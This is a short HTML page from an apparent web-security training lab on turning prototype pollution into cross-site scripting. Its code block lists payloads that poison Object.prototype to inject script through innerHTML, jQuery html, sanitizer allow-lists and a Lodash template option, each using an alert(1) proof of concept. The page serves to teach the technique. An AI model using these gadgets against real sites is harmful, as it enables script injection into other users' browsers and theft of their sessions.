    <div class="lab-header"><h1>⚗️ Prototype Pollution → XSS</h1><div class="lab-info"><span class="lab-tag difficulty-hard">Hard</span></div></div>
    <div class="lab-section"><h2><i class="fas fa-crosshairs"></i> Objective</h2><p>Use prototype pollution to inject properties that are later rendered unsafely in the DOM, achieving cross-site scripting.</p></div>
    <div class="lab-section"><h2><i class="fas fa-terminal"></i> Technique</h2>
      <div class="code-block">// If a library checks obj.innerHTML or obj.srcdoc:
Object.prototype.innerHTML = "&lt;img src=x onerror=alert(1)&gt;";

// jQuery gadgets:
Object.prototype.html = "&lt;script&gt;alert(1)&lt;/script&gt;";

// Sanitizer bypass:
Object.prototype.allowedTags = ["script","img"];
Object.prototype.allowedAttributes = {"*":["onerror","onload","src"]};

// Lodash template:
Object.prototype.sourceURL = "\u000areturn e=&gt;{e(1)}";</div>
    </div>
